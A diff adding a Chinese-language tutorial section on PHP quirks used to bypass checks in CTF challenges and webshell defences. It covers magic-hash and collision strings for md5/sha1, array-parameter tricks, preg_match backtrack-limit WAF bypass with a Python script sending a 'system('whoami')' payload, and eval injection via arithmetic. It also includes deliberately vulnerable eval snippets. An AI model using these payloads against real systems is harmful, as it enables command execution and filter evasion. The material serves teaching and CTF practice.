@@ -803,6 +803,275 @@ echo json_encode($res);
 ![PHP过滤器.png](https://blog.zgsec.cn/usr/uploads/2023/03/2236941522.png)
 
 
+# 8# PHP特性利用
+
+### 8.0 Tips
+
+不管是在CTF还是在Webshell攻防当中，妥善利用好PHP的特性能让你成功ByPass
+
+### 8.1 HASH比较绕过
+
+```php
+if (isset($_GET['sum1']) and isset($_GET['sum2'])) {
+    if ($_GET['sum1'] != $_GET['sum2']) {
+        if (md5($_GET['sum1']) == md5($_GET['sum2'])) {
+            die('恭喜你成功绕过');
+        }else
+            print '错误';
+    }
+}
+```
+
+PHP在处理哈希字符串时通过 `!=` 或 `==` 来对哈希值进行比较，会把每一个以0e开头的哈希值都解释为0，所以如果两个不同的密码的哈希值都是以0e开头的，那么PHP将会认为他们都是0，也就相同了，常见的 `md5()` 绕过如下：
+
+```
+QNKCDZO ==> 0e830400451993494058024219903391
+240610708 ==> 0e462097431906509019562988736854
+s155964671a ==> 0e342768416822451524974117254469
+s214587387a ==> 0e848240448830537924465865611904
+s878926199a ==> 0e545993274517709034328855841020
+s1091221200a ==> 0e940624217856561557816327384675
+```
+
+同样还有 `sha1()` 的绕过：
+
+```
+aaK1STfY ==> 0e76658526655756207688271159624026011393
+aaO8zKZF ==> 0e89257456677279068558073954252716165668
+```
+
+### 8.2 MD5函数绕过
+
+```php
+if (isset($_GET['sum1']) and isset($_GET['sum2'])) {
+    if ($_GET['sum1'] == $_GET['sum2'])
+        echo "sum1 不能等同于 sum2";
+    else if (md5($_GET['sum1']) === md5($_GET['sum2'])) {
+            die("sum1 的MD5值等于 sum2 的MD5值，恭喜你成功绕过！");
+        }else
+            print '错误';
+}
+```
+
+`md5()` 函数无法获取到数组的值，默认数组为0，这个方法同样可以绕过 `sha1()` 函数，所以Payload如下
+
+```
+sum1[]=123&sum2[]=456
+```
+
+### 8.3 MD5函数强类型绕过
+
+```php
+if (isset($_GET['sum1']) and isset($_GET['sum2'])) {
+    if ((string)$_GET['sum1'] !== (string)$_GET['sum2']) {
+        if (md5($_GET['sum1']) === md5($_GET['sum2']))
+            die("sum1 的MD5值等于 sum2 的MD5值，恭喜你成功绕过！");
+    }else
+            print '错误';
+}
+```
+
+这里使用数组就不可行，因为会转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串：
+
+```
+sum1=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
+sum2=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2
+```
+
+或者
+
+```
+sum1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+sum2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+```
+
+### 8.4 SHA1函数强类型绕过
+
+```php
+if (isset($_GET['sum1']) and isset($_GET['sum2'])) {
+    if ((string)$_GET['sum1'] !== (string)$_GET['sum2']) {
+        if (sha1($_GET['sum1']) === sha1($_GET['sum2']))
+            die("sum1 的SHA1值等于 sum2 的SHA1值，恭喜你成功绕过！");
+    }else
+            print '错误';
+}
+```
+
+构造两个SHA1值相同的不同字符串：
+
+```
+sum1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
+sum2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
+```
+
+### 8.5 `preg_match`函数绕过
+
+```php
+preg_match ( string $pattern , string $subject , array &$matches = null , int $flags = 0 , int $offset = 0 ) : int|false
+```
+
+**`preg_match()` 函数是PHP中用于匹配正则表达式的函数之一，该函数用来检索字符串中是否存在符合正则表达式模式的子字符串，并将结果存储在一个数组中，返回值是匹配成功的次数**
+
+- pattern：正则表达式模式，如 `'/^[a-zA-Z0-9_]+$/'`
+- subject：要匹配的字符串，如 `hello world`
+- matches：存储匹配结果的数组，可以省略不写，也可以在函数外先定义后写入
+
+#### 8.5.1 `/m` 绕过
+
+```php
+preg_match('/^php$/im',$sum);
+```
+
+`/m` 是多行匹配，但是当出现换行符 `%0a` 的时候会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略
+
+#### 8.5.2 回溯绕过
+
+PHP正则利用的是NFA（非确定性有限自动机），想了解这个的可以百度找相关文章
+
+- 遇到 `.*` 或者 `.+` ==> 直接匹配字符串末尾，然后一个个回溯，与之后的模式比较
+- 遇到 `.*?` 或者 `.+?` ==> 非贪婪模式，在匹配到符合的字符串就停止 ==> 由下一个模式匹配 ==> 下一个模式不符合，回溯 ==> 再由 `.*?` 匹配直到下一个模式符合
+
+```php
+if (isset($_POST['f'])) {
+    $f = $_POST['f'];
+    if (preg_match('/<\?.*[(`;?>].*/is', $f)) {
+        die('发现敏感字符串');
+    }
+    if (stripos($f, 'system(') == False) {
+        die('不允许system');
+    }
+    eval($_POST['f']);
+    echo '恭喜你成功绕过';
+}
+```
+
+注：PHP为了防止正则表达式的拒绝服务攻击（reDOS），给 `pcre` 设定了一个回溯次数上限 `pcre.backtrack_limit`，可以通过以下代码查看当前环境下的上限：
+
+```php
+var_dump(ini_get(‘pcre.backtrack_limit’));
+```
+
+回溯次数上限默认是100万，如果回溯次数超过了100万，`preg_match` 返回的便不再是0或1，而是 `false`
+
+可以写一个Python脚本来使回溯次数超出 `pcre.backtrack_limit` 限制从而绕过WAF：
+
+```python
+import requests
+
+url = 'http://test.ctf.com/WebShell-Bypass-Guide/test.php'
+data = {
+    'f': 'system(\'whoami\');//'+'Aabyss'*166667
+}
+reponse = requests.post(url, data=data)
+print(reponse.text)
+```
+
+### 8.6 `strpos()` 函数绕过
+
+```php
+strpos ( string $haystack , mixed $needle , int $offset = 0 ) : int
+```
+
+**`stripos()` 用来查找字符串中某部分字符串首次出现的位置(不区分大小写)**
+
+`strpos()` 函数如果传入数组，便会返回NULL
+
+### 8.7 `ereg()` 函数绕过
+
+```php
+int ereg(string pattern, string originalstring, [array regs]);
+```
+
+**`ereg()` 函数用指定的模式搜索一个字符串中指定的字符串，如果匹配成功返回true，否则返回false，搜索字母的字符是大小写敏感的**
+
+- `ereg()` 函数存在NULL截断漏洞，可以 `%00` 截断，遇到 `%00` 则默认为字符串的结束，所以可以绕过一些正则表达式的检查
+- `ereg()` 只能处理字符串，遇到数组做参数返回NULL
+- 空字符串的类型是string，NULL的类型是NULL，false、true是Boolean类型
+
+### 8.8 `strcmp()` 函数绕过
+
+```php
+strcmp ( string $str1 , string $str2 ) : int
+```
+
+**`strcmp()` 函数是string compare(字符串比较)的缩写，用于比较两个字符串(区分大小写）并根据比较结果返回整数**
+
+如果 `str1` 小于 `str2` 返回 < 0； 如果 `str1` 大于 `str2` 返回 > 0；如果两者相等，返回 0。
+
+`strcmp()` 函数是比较字符串类型的，但如果输入其他类型这个函数将发生错误，会返回NULL
+
+```php
+$pass = @$_POST['pass'];
+$truepass = $flag;      //不知道的密码参数
+if (isset($pass)) {
+    if (@!strcmp($pass, $truepass)) {
+        echo "成功绕过，登录系统成功";
+    }else {
+        echo "密码错误";
+    }
+}else{
+    echo "请输入密码";
+}
+```
+
+这里通过传入数组也可以让结果返回NULL，NULL再取反为TRUE
+
+```
+pass[]=Aabyss
+```
+
+### 8.9 PHP变量名和传参特性
+
+#### 8.9.1 PHP的变量名特性
+
+```php
+if ($_GET['po_p.er'] === "w_ai_tan_ji") {
+    echo "恭喜你传参成功";
+}
+else{
+    die('你失败了');
+}
+```
+
+这是最近CTF遇到的一道题，但 `$_GET['po_p.er']` 无法传入参数，这是因为PHP变量名应该只有数字、字母、下划线；而GET或POST方式传进去的变量名，会自动将以下内容自动转换为 `_`：
+
+```php
+空格 + . [
+```
+
+但其中有特殊情况：GET或POST方式传参时，变量名中的 `[` 会被替换为 `_`，重点是它后面的字符就不会被替换了，那可以构造以下Payload：
+
+```php
+po[p.er=w_ai_tan_ji
+```
+
+#### 8.9.2 PHP数字可与字符做运算
+
+在PHP中，数字是可以和命令进行一些运算的，比如 `1-phpinfo()` 是可以成功执行phpinfo语句，同样的还有以下运算符：
+
+```php
++ - * | %
+```
+
+那我们不妨看以下代码：
+
+```php
+$v1 = (String)$_GET['a'];
+$v2 = (String)$_GET['b'];
+$v3 = (String)$_GET['c'];
+if(is_numeric(a) && is_numeric(c)){
+    echo "$a$b$c = ".$code;
+    $code =  eval("return $a$b$c;");
+}
+```
+
+构造Payload如下：
+
+```php
+a=1&b=-phpinfo()-&c=2
+```
+
+
 # 三、Webshell免杀
 
 ## 学习后的免杀效果
